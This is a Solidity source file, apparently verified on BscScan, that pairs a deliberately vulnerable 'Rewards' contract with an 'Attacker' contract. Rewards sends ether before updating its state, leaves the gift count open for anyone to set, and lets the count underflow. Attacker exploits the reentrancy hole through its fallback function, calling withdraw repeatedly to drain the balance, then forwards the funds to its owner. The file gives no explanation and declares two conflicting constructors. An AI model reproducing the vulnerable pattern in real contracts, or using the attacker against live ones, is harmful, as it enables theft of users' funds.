/**
 *Submitted for verification at BscScan.com on 2022-04-30
*/

pragma solidity ^0.4.22;

contract Rewards {
    uint public gifts;
    address private owner;
    function allowGifts(uint num_gifts) public { gifts = num_gifts; }

    function withdraw() public {
        uint _amount = 0.002 ether;
        if (gifts > 0) {
           if (!msg.sender.call.value(_amount)()) revert(); 
           gifts -= 2000000;
        }
    }

    function deposit() payable public {}

    function getBalance() public constant returns(uint) { 
        address a = this;
        return a.balance; 
    }    
}

contract Attacker {
    
    Rewards r;
    uint public count;
    event LogFallback(uint count, uint balance);
    address private owner;

    constructor(address rewards) public payable { r = Rewards(rewards); }

    function Attacker() {
        owner = msg.sender;
    }
    
    modifier onlyOwner {
        require(msg.sender == owner);
        _; 
    }
    
    function attack() public { r.withdraw(); }

    function ()  payable public {
        count++;
        address a = this;
        emit LogFallback(count, a.balance);     // make log entry
        if(count < 10) r.withdraw();            // limit number of withdrawals
    }
    
   
     function withdraw(uint amount) onlyOwner returns(bool) {
        // uint amount = pendingWithdraws[msg.sender];
        // pendingWithdraws[msg.sender] = 0;
        // msg.sender.transfer(amount);
        require(amount < this.balance);
        owner.transfer(amount);
        return true;

    }


    function getBalance() public constant returns(uint) { 
        address a = this;
        return a.balance;
    }    
     
    
}